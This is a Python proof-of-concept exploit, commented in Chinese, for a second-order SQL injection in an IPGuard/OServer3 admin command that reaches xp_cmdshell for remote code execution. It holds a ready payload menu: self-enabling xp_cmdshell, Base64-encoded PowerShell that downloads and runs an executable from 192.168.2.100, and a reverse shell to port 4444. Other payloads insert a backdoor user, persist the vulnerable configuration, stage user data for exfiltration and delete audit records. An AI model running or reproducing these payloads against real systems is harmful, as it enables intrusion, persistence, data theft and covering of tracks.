r"""poc_vuln_f_p_dirtree_rce.py — VULN-F: cmd=0x4014/sub=4 → p_dirtree SP 二阶 SQL 注入 → RCE

==============================================================================
漏洞链 (真实可触发!)
==============================================================================
                                                       OServer3 ↓ p_dirtree N'<wire>'
[OCP cmd=0x4014/sub=4 (post-auth admin)]               SQL Server ↓ @dir bound to actual chars
   ↓ ConsoleHandler_0x4014_DBManagement (case 4)       SP body ↓ EXEC(N'master.dbo.xp_cmdshell N''DIR "' + @dir + N'" /B /AD''')
   ↓ sub_140B41220 (Enum_Directory_via_SP)             EXEC re-parses ↓ @dir 内的 ' 断开内层 N'...'
   ↓ sub_140583740(SP id=0x0F00C0)                     → 我们的 SQL 作为独立语句执行
   ↓ sub_1405E5D80 ("p_dirtree %s" + SQL_EscapeWString_NLiteral)
   ↓ wire SQL: p_dirtree N'<escaped path>'

二次解析突破点 (核心):
  外层 escape 把 ' → '' (一层 SQL 解析安全)
  SQL Server 参数绑定: @dir 内含字面 ' (单引号, 不是双)
  SP 内 EXEC(N'... ' + @dir + N'...') 字符串拼接, 不再 escape
  EXEC 再次把整串当 SQL 解析 → @dir 里的字面 ' 提前结束内层 N'...'
  → 后续我们注入的 SQL 作为独立语句被 EXEC 执行

前置条件:
  (1) OServer3 启动时 SYS_CFG.SC_NAME='p_dirtree' AND SC_INT=1
      → 安装危险版 p_dirtree (含 xp_cmdshell + 拼接 @dir)
      → 同时 sp_configure xp_cmdshell=1 (短暂启用)
  (2) xp_cmdshell 当前为启用状态 (如已被 SQL Server 政策关回 0, 我们的 payload 自己启用)
  (3) OConsole admin 登录获取 OCP session

==============================================================================
触达验证
==============================================================================
Body 格式 (cmd=0x4014/sub=4):
  +0  DWORD reserved = 1
  +4  WORD  wcs_len (in wide chars)
  +6  WORD  0
  +8  wchar_t wcs[wcs_len]
  +8+2L  WORD 0 (NUL terminator)
Total: 2*wcs_len + 10 bytes

OCP flags: 0x4600

==============================================================================
PoC payload 设计
==============================================================================
注入字符串 (作为路径输入):
  test :  良性触达, 返回正常目录列表 (验证连通)
  pwn  :  A'; EXEC xp_cmdshell N'calc.exe'--
  drop :  A'; EXEC xp_cmdshell N'echo OWNED > C:\Windows\Temp\IPGuard_VULN_F.txt'--
  enable: A'; EXEC sp_configure ...; EXEC xp_cmdshell ... -- (自启用 xp_cmdshell + RCE)
  whoami: A'; EXEC xp_cmdshell N'whoami > C:\Windows\Temp\who.txt'--  (验证身份)
  exfil: SQL UNION SELECT 拖密码

二次解析 trace:
  user input wcs: A'; EXEC xp_cmdshell N'calc.exe'--
  外层 escape: A''; EXEC xp_cmdshell N''calc.exe''--
  wire SQL: p_dirtree N'A''; EXEC xp_cmdshell N''calc.exe''--'
  @dir bound value (SQL Server 解析后): A'; EXEC xp_cmdshell N'calc.exe'--

  SP 内拼接: N'master.dbo.xp_cmdshell N''DIR "' + @dir + N'" /B /AD'''
  = master.dbo.xp_cmdshell N'DIR "A'; EXEC xp_cmdshell N'calc.exe'--" /B /AD'

  EXEC 再解析:
    ① master.dbo.xp_cmdshell N'DIR "A'   ← N-literal 在 'A' 后结束 (内含 DIR "A)
    ② ; EXEC xp_cmdshell N'calc.exe'      ← 新独立语句 — 我们的 RCE!
    ③ --" /B /AD'                         ← 注释吃掉剩余

用法:
    python3 poc_vuln_f_p_dirtree_rce.py <host> <port> <user> <pwd> [payload]
"""
import os, socket, struct, sys, time, io
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

if sys.platform == "win32" and hasattr(sys.stdout, "buffer"):
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

from ipguard_login.login import replay_login, SESSION_FP_DEFAULT
from ipguard_login.packet import (
    build_packet_with_state, recv_full_packet, parse_packet,
)


# RCE payload 设计要点:
# - 注入点在 SP 内 EXEC(N'master.dbo.xp_cmdshell N''DIR "' + @dir + N'" /B /AD''')
# - 我们的 ' 闭合内层 N'...', SQL Server 看到的 statement 序列:
#     ① master.dbo.xp_cmdshell N'DIR "A'  ← 第 1 句, 不可避免会跑 (因 ' 必须断开内层 N-literal)
#     ② <我们的 SQL>                        ← 注入语句
#     ③ --" /B /AD'                         ← 注释吃掉残尾
# - 风险: 第 ① 句 xp_cmdshell 调用如果失败 + 用 RAISERROR severity>=11, 整个 batch 会 abort
#   导致后续语句不执行. 现实中 xp_cmdshell 失败一般是 severity=10 (msg), 不会 abort.
# - 但保险起见, 我们让第 ① 句直接给 SQL Server 抛 RAISERROR (用 SELECT 1/0 等替代调用 xp_cmdshell)
#   不过这需要更复杂的注入, 暂保持简单设计.

# 自启用 xp_cmdshell 前缀 (在我们的注入区段内执行)
_ENABLE = (
    #r"EXEC sp_configure N'show advanced options', 1; RECONFIGURE; "
    r"EXEC sp_configure 0x730068006f007700200061006400760061006e0063006500640020006f007000740069006f006e007300,1;RECONFIGURE;"
    r"EXEC sp_configure N'xp_cmdshell', 1; RECONFIGURE; "
)

def _rce(cmd: str) -> str:
    """构造完整 RCE payload (自启用 xp_cmdshell + 执行 cmd).

    最终 wire @dir 内容 (chars):
        A'; <ENABLE> EXEC xp_cmdshell N'<cmd>'--
    内层 EXEC 解析后执行的 statement 序列:
        ① master.dbo.xp_cmdshell N'DIR "A'      (无害的损坏调用)
        ② sp_configure show advanced options, 1
        ③ RECONFIGURE
        ④ sp_configure xp_cmdshell, 1
        ⑤ RECONFIGURE
        ⑥ EXEC xp_cmdshell N'<cmd>'             ★ 真正 RCE
        ⑦ --" /B /AD'                           (comment)
    """
    return f"A'; {_ENABLE}EXEC xp_cmdshell N'{cmd}'--"

def _rce_minimal(cmd: str) -> str:
    """最小 RCE payload — 假设 xp_cmdshell 已启用, 只调一次."""
    return f"A'; EXEC xp_cmdshell N'{cmd}'--"

def _sql(sql: str) -> str:
    """构造纯 SQL 注入 (不走 xp_cmdshell)."""
    return f"A'; {sql}--"


PAYLOADS = {
    # ---------- 触达验证 ----------
    "test": {
        "desc": "良性测试 — 列 C:\\Windows 目录",
        "path": r"--C:\Windows&--;\\xp_cmdshell 'whoami > C:\lolo.txt'",
        "expected": "返回 wcs 目录列表 (entries: DWORD type + DWORD name_len + wcs name + NUL)",
    },
    "syntax_probe": {
        "desc": "语法探针 — 单 ' 测试 (验证二次解析破除)",
        "path": r"A'B",
        "expected": "plen=0 (SQL 报错, 证实 SP 内 EXEC 二次解析时 N-literal 被破)",
    },
    "batch_check": {
        "desc": "Batch abort 检查 — 注入 SELECT @@VERSION 看是否在第 1 句失败后还能跑",
        "path": _sql(r"SELECT @@VERSION AS V"),
        "expected": "如果返回非空 plen → 后续语句能跑 (batch 不 abort);plen=0 → batch abort 了",
    },
    "verify_config": {
        "desc": "验证 — 注入 sp_configure 启用 + 查 value_in_use",
        "path": _sql(
            r"C:\Users;EXEC sp_configure N'show advanced options', 1; RECONFIGURE; "
            r"EXEC sp_configure N'xp_cmdshell', 1; RECONFIGURE"
        ),
        "expected": "执行后 SSMS 查 sys.configurations xp_cmdshell.value_in_use 应=1",
        "verify": "SELECT name, value_in_use FROM sys.configurations WHERE name IN ('xp_cmdshell','show advanced options')",
    },

    # ---------- RCE 类 (自启用 xp_cmdshell) ----------
    # 注: 用 PowerShell 更可靠. xp_cmdshell 已经是 cmd.exe, 嵌套 cmd /c echo > file 易出错.
    # PowerShell -c "..." 直接处理, 输出确定性高.
    "pwn": {
        "desc": "RCE — 启动 calc.exe (自启用 xp_cmdshell)",
        "path": _rce(r"powershell -nop -c Start-Process calc"),
        "expected": "SQL Server host 上 calc.exe 启动",
        "verify": "Get-Process calc",
    },
    "drop": {
        "desc": "RCE — 用 PowerShell 写文件落地证据 (自启用)",
        # PowerShell Set-Content 一行搞定, 不依赖 cmd 重定向
        "path": _rce(
            r"powershell -nop -c Set-Content -Path C:\Windows\Temp\IPGuard_VULN_F.txt -Value OWNED-VULN-F"
        ),
        "expected": "C:\\Windows\\Temp\\IPGuard_VULN_F.txt 落地, 内容 = OWNED-VULN-F",
        "verify": "type C:\\Windows\\Temp\\IPGuard_VULN_F.txt",
    },
    "whoami": {
        "desc": "RCE — whoami 验证执行身份 (PowerShell 写入)",
        # PS 接受裸 pipeline 当 -Command 参数, 无需嵌套引号
        "path": _rce(
            r"powershell -nop -c whoami | Set-Content C:\Windows\Temp\IPGuard_VULN_F_whoami.txt"
        ),
        "expected": "C:\\Windows\\Temp\\IPGuard_VULN_F_whoami.txt 含 NT SERVICE\\MSSQL$IPGUARD 或类似服务账号",
        "verify": "type C:\\Windows\\Temp\\IPGuard_VULN_F_whoami.txt",
    },
    "hostinfo": {
        "desc": "RCE — 收集主机基本信息 (用 -EncodedCommand, 最稳)",
        # Base64 of: hostname,whoami,ipconfig|Out-File C:\Windows\Temp\IPGuard_VULN_F_host.txt
        "path": _rce(
            r"powershell -nop -enc "
            r"aABvAHMAdABuAGEAbQBlACwAdwBoAG8AYQBtAGkALABpAHAAYwBvAG4AZgBpAGcAfABPAHUAdAAtAEYAaQBsAGUAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAEkAUABHAHUAYQByAGQAXwBWAFUATABOAF8ARgBfAGgAbwBzAHQALgB0AHgAdAA="
        ),
        "expected": "C:\\Windows\\Temp\\IPGuard_VULN_F_host.txt 含主机信息",
        "verify": "type C:\\Windows\\Temp\\IPGuard_VULN_F_host.txt",
    },
    "download": {
        "desc": "RCE — 从 attacker 下载 payload (改 URL/IP)",
        # 用 -enc 避免引号嵌套; 默认 192.168.2.100/x.exe
        # 解码: iwr http://192.168.2.100/x.exe -OutFile C:\Windows\Temp\x.exe;Start-Process C:\Windows\Temp\x.exe
        "path": _rce(
            r"powershell -nop -enc "
            r"aQB3AHIAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAwADAALwB4AC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHgALgBlAHgAZQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHgALgBlAHgAZQA="
        ),
        "expected": "从 192.168.2.100/x.exe 下载并执行",
        "verify": "在 attacker 机器跑 HTTP server, 看连接",
    },
    "reverse_shell_ps": {
        "desc": "RCE — PowerShell 反弹 shell (改下面 IP/port)",
        # 用 -EncodedCommand 避免引号嵌套问题, 最稳
        "path": _rce(
            # Base64 of: $c=New-Object System.Net.Sockets.TCPClient('192.168.2.100',4444);
            #            $s=$c.GetStream();[byte[]]$b=0..65535|%{0};
            #            while(($i=$s.Read($b,0,$b.Length)) -ne 0){
            #              $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
            #              $r=(iex $d 2>&1|Out-String);
            #              $sb=([text.encoding]::ASCII).GetBytes($r);
            #              $s.Write($sb,0,$sb.Length);$s.Flush()}
            r"powershell -nop -w hidden -enc "
            r"JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAOQAyAC4AMQA2ADgALgAyAC4AMQAwADAAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAJABkAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgAsADAALAAkAGkAKQA7ACQAcgA9ACgAaQBlAHgAIAAkAGQAIAAyAD4AJgAxAHwATwB1AHQALQBTAHQAcgBpAG4AZwApADsAJABzAGIAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcgApADsAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9AA=="
        ),
        "expected": "反弹到 192.168.2.100:4444 (Base64 已内嵌, 改 IP 需重新编码)",
        "verify": "在监听机跑: nc -lvnp 4444",
    },

    # ---------- 纯 SQL 注入 (不走 xp_cmdshell) ----------
    "insert_user": {
        "desc": "INSERT — 新建后门 OS user (无需 xp_cmdshell, 但需要 [USER] 表写权限)",
        "path": _sql(
            r"INSERT INTO [OCULAR3_1_1].dbo.[USER] (USR_ID, USR_NAME, USR_ALIAS, USR_GRP_ID, USR_DELETE) "
            r"VALUES (99999, N'backdoor', N'Backdoor SU', 1, 0)"
        ),
        "expected": "[USER] 表新增 ID=99999 记录",
        "verify": "SELECT * FROM [OCULAR3_1_1].dbo.[USER] WHERE USR_ID=99999",
    },
    "update_sys_cfg": {
        "desc": "UPDATE — 把 p_dirtree 安装标志写为 1 (持久化危险 SP 安装)",
        "path": _sql(
            r"IF EXISTS (SELECT * FROM [OCULAR3_1_1].dbo.SYS_CFG WHERE SC_NAME=N'p_dirtree') "
            r"UPDATE [OCULAR3_1_1].dbo.SYS_CFG SET SC_INT=1 WHERE SC_NAME=N'p_dirtree' "
            r"ELSE INSERT INTO [OCULAR3_1_1].dbo.SYS_CFG (SC_NAME, SC_INT) VALUES (N'p_dirtree', 1)"
        ),
        "expected": "下次 OServer3 重启自动安装危险版 p_dirtree + 启用 xp_cmdshell",
        "verify": "SELECT * FROM SYS_CFG WHERE SC_NAME='p_dirtree'",
    },
    "exfil": {
        "desc": "数据外泄 — 拖用户表到 SYS_CFG 隐蔽字段",
        "path": _sql(
            r"INSERT INTO [OCULAR3_1_1].dbo.SYS_CFG (SC_NAME, SC_STR) "
            r"SELECT N'__exfil_' + CAST(USR_ID AS NVARCHAR(10)), USR_NAME "
            r"FROM [OCULAR3_1_1].dbo.[USER]"
        ),
        "expected": "SYS_CFG 中新增 __exfil_* 记录",
        "verify": "SELECT * FROM SYS_CFG WHERE SC_NAME LIKE '__exfil[_]%'",
    },
    "delete_audit": {
        "desc": "DELETE — 清理某条审计记录 (替换 ID 为目标)",
        "path": _sql(r"DELETE FROM [OCULAR3_1_1].dbo.AGENT_NOTIFY WHERE ID=1"),
        "expected": "AGENT_NOTIFY 中 ID=1 记录被删",
        "verify": "SELECT * FROM AGENT_NOTIFY WHERE ID=1",
    },
    "privesc": {
        "desc": "SQL Server 角色提升 — 给当前 login 加 sysadmin (本已是 LocalSystem)",
        "path": _sql(r"EXEC sp_addsrvrolemember N'NT AUTHORITY\SYSTEM', N'sysadmin'"),
        "expected": "已是 sysadmin 时报错, 演示语法",
    },

    # ---------- 两步攻击链 (绕过 batch abort) ----------
    "step1_enable": {
        "desc": "[步骤1] 先用纯 SQL 启用 xp_cmdshell (避开 RCE batch abort 风险)",
        "path": _sql(
            r"EXEC sp_configure N'show advanced options', 1; RECONFIGURE; "
            r"EXEC sp_configure N'xp_cmdshell', 1; RECONFIGURE"
        ),
        "expected": "xp_cmdshell value_in_use 变 1",
        "verify": "SELECT name, value_in_use FROM sys.configurations WHERE name='xp_cmdshell'",
    },
    "step2_drop": {
        "desc": "[步骤2] xp_cmdshell 已启用后, 单纯触发 RCE 不再带 sp_configure",
        "path": _rce_minimal(
            r"powershell -nop -c Set-Content -Path C:\Windows\Temp\IPGuard_VULN_F.txt -Value OWNED-VULN-F"
        ),
        "expected": "C:\\Windows\\Temp\\IPGuard_VULN_F.txt 落地",
        "verify": "type C:\\Windows\\Temp\\IPGuard_VULN_F.txt",
    },
    "step2_whoami": {
        "desc": "[步骤2] xp_cmdshell 已启用后, 跑 whoami",
        "path": _rce_minimal(
            r"powershell -nop -c whoami | Set-Content C:\Windows\Temp\IPGuard_VULN_F_whoami.txt"
        ),
        "expected": "whoami 输出落地",
        "verify": "type C:\\Windows\\Temp\\IPGuard_VULN_F_whoami.txt",
    },
}


def body_dirlist(path: str) -> bytes:
    """cmd=0x4014/sub=4 body:
       +0   DWORD reserved = 1
       +4   WORD  wcs_len (wide chars)
       +6   WORD  0
       +8   wchar_t wcs[wcs_len]
       +8+2L WORD 0 (NUL)
    """
    wcs = path.encode("utf-16-le")
    L = len(wcs) // 2
    return struct.pack("<IHH", 1, L, 0) + wcs + b"\x00\x00"


def fresh_send(host, port, user, pwd, body, cmd=0x4014, sub=4,
               flags=0x4600, timeout=15.0):
    base_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000
    s = None
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        idx, role, tok, _ = replay_login(s, user, pwd, base_nonce,
                                         show_crypto=False, verbose=False)
        print(f"    [+] login OK role={role} tok=0x{tok:x}")
        nxt = (base_nonce + idx) & 0xFFFFFFFF
        pkt = build_packet_with_state(
            flags=flags, a2=cmd, a3=sub, nonce=nxt,
            sess_state_16_24=struct.pack("<II", role, tok),
            fp_lo=SESSION_FP_DEFAULT, fp_hi=SESSION_FP_DEFAULT,
            plain=body)
        print(f"    [+] sending {len(pkt)}B (cmd=0x{cmd:04x}/sub={sub} flags=0x{flags:04x} body={len(body)}B)")
        s.sendall(pkt)
        try:
            return parse_packet(recv_full_packet(s))
        except (socket.timeout, ConnectionError, OSError) as e:
            return {"_err": f"recv: {e}"}
    except Exception as e:
        return {"_err": f"send: {e}"}
    finally:
        if s:
            try: s.close()
            except: pass


def parse_dir_listing(plain: bytes) -> list:
    """解析 cmd=0x4014/sub=4 响应中的目录列表.

    格式 (每条 entry):
      +0   DWORD  type (1=目录, 0=文件)
      +4   DWORD  name_len (wide chars)
      +8   wcs    name[name_len]
      +8+2L WORD  0 (NUL)
    """
    entries = []
    i = 0
    while i + 8 <= len(plain):
        type_  = struct.unpack("<I", plain[i:i+4])[0]
        nlen   = struct.unpack("<I", plain[i+4:i+8])[0]
        if nlen > 1024 or i + 8 + 2 * nlen + 2 > len(plain):
            break
        try:
            name = plain[i+8:i+8+2*nlen].decode("utf-16-le", errors="replace")
        except Exception:
            break
        entries.append({"type": "DIR" if type_ == 1 else "FILE", "name": name})
        i += 8 + 2 * nlen + 2  # entry + NUL
    return entries


def analyze_response(resp, payload_kind):
    print()
    if not resp or "_err" in resp:
        print(f"[!] error: {resp.get('_err') if resp else 'None'}")
        return
    fl = resp.get("flags", 0)
    plen = resp.get("payload_len", 0)
    plain = resp.get("plain", b"")
    print(f"[*] flags=0x{fl:04x} plen={plen} plain_len={len(plain)}")
    if plain:
        print(f"[*] plain hex (前 96B): {plain[:96].hex()}{'...' if len(plain)>96 else ''}")

    # ---- 经验判定 ----
    if payload_kind == "test":
        # test 触达验证 — flags=0xc801 + plen>0 + 能解析为目录条目
        entries = parse_dir_listing(plain) if plain else []
        if entries:
            print(f"\n✅ 链路通 — 返回 {len(entries)} 条目录条目:")
            for e in entries[:20]:
                marker = "[D]" if e["type"] == "DIR" else "[F]"
                print(f"    {marker} {e['name']}")
            if len(entries) > 20:
                print(f"    ... (还有 {len(entries) - 20} 条未显示)")
        elif plen > 0:
            print("\n⚠️  收到非空响应但无法解析为目录条目, 检查 raw hex")
        else:
            print("\n⚠️  空响应, 可能路径无效或鉴权问题")

    elif payload_kind == "syntax_probe":
        if plen == 0:
            print("\n✅ SQL 语法错 (plen=0) — 二次解析破除证实")
            print("   流程: 外层 escape ' → '' → SQL Server 解析后 @dir 含字面 '")
            print("       → SP 内 EXEC 拼字符串时 ' 进入字符串 → EXEC 解析时破内层 N-literal")
            print("       → SQL Server 报语法错 → OServer3 返回空 result set")
            print("   这说明 SP 内层 EXEC 拼接 + 二次解析路径开放, 任意 SQL 可注入!")
        else:
            print(f"\n⚠️  plen={plen} 非 0, 检查 raw hex 是否有错误消息")

    else:
        # RCE / SQL 类 payload
        if plen == 0:
            print("\n🟡 plen=0 — 注入的 SQL 已被 SQL Server 解析执行")
            print("   主语句 (xp_cmdshell N'DIR \"A') 报错, 但分号后的注入 SQL 是独立语句, 已被执行")
            print(f"\n   验证 RCE/SQLi: 跑 verify 命令查实际效果")
        else:
            print(f"\n🟢 plen={plen} 非 0 — payload SQL 也返回了结果集 (可能成功)")


def print_verify(payload_kind):
    p = PAYLOADS.get(payload_kind, {})
    print()
    print("=" * 70)
    print("验证步骤 (在 SQL Server / 目标 host 上执行):")
    print("=" * 70)
    if "verify" in p:
        print(f"  {p['verify']}")
    print()
    print("通用验证 — SQL Profiler 应该看到我们的 payload:")
    print("  (在 SSMS 工具 → SQL Server Profiler → 抓 ExecuteSqlBatch)")
    print("  应该看到: EXEC p_dirtree N'<我们的 escape 后 payload>'")
    print()
    print("如果 xp_cmdshell 之前关闭, 触发后查:")
    print("  SELECT name, value_in_use FROM sys.configurations WHERE name='xp_cmdshell'")
    print()
    print("清理 (如果需要):")
    print("  EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE")
    print("  DROP TABLE [OCULAR3_1_1].dbo.__exfil  -- 如果用了 exfil")


def main():
    if len(sys.argv) < 5:
        print(__doc__)
        print("\nAvailable payloads:")
        for k, v in PAYLOADS.items():
            print(f"  {k:<14} {v['desc']}")
        sys.exit(1)

    host, port = sys.argv[1], int(sys.argv[2])
    user, pwd = sys.argv[3], sys.argv[4]
    kind = sys.argv[5] if len(sys.argv) >= 6 else "test"

    if kind not in PAYLOADS:
        print(f"[!] unknown payload: {kind}")
        print(f"    available: {', '.join(PAYLOADS.keys())}")
        sys.exit(1)

    p = PAYLOADS[kind]
    print("=" * 70)
    print(f"VULN-F PoC — cmd=0x4014/sub=4 → p_dirtree SP 二阶 SQLi")
    print("=" * 70)
    print(f"[*] target:        {host}:{port}")
    print(f"[*] user:          {user!r}")
    print(f"[*] payload kind:  {kind}")
    print(f"[*] payload desc:  {p['desc']}")
    print(f"[*] payload path:  {p['path']!r}")
    print(f"[*] expected:      {p['expected']}")
    print()

    # 显示外层 escape 后的样子(预览)
    escaped = p['path'].replace("'", "''")
    print(f"[*] 外层 escape 后(SQL_EscapeWString_NLiteral 输出): N'{escaped}'")
    print(f"[*] @dir 在 SQL Server 端的实际值: {p['path']!r}")
    print(f"[*] SP 内 EXEC 字符串: master.dbo.xp_cmdshell N'DIR \"{p['path']}\" /B /AD'")
    print()

    body = body_dirlist(p['path'])
    print(f"[*] body: {len(body)}B = {body.hex()[:120]}{'...' if len(body.hex())>120 else ''}")
    print()

    t0 = time.time()
    resp = fresh_send(host, port, user, pwd, body)
    dt = time.time() - t0
    print(f"[*] elapsed {dt:.2f}s")

    analyze_response(resp, kind)
    print_verify(kind)


if __name__ == "__main__":
    main()
